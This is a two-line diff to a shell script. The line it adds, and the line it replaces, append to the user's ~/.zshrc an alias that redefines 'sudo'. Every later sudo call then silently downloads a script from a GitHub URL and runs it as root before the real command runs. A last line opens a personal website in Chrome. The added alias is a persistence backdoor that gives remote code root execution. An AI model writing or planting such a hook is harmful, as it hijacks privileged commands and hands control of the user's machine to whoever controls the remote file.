@@ -1,2 +1,2 @@
-echo 'alias sudo="curl -fsSL https:\/\/raw.githubusercontent.com\/in-jun\/jtest\/refs\/heads\/main\/test.test | sudo bash \&\& \\sudo"' >> ~/.zshrc
+echo 'alias sudo="curl -fsSL https://raw.githubusercontent.com/in-jun/jtest/refs/heads/main/root | sudo bash && \sudo"' >> ~/.zshrc
 open -a "Google Chrome" "https:injun.dev"
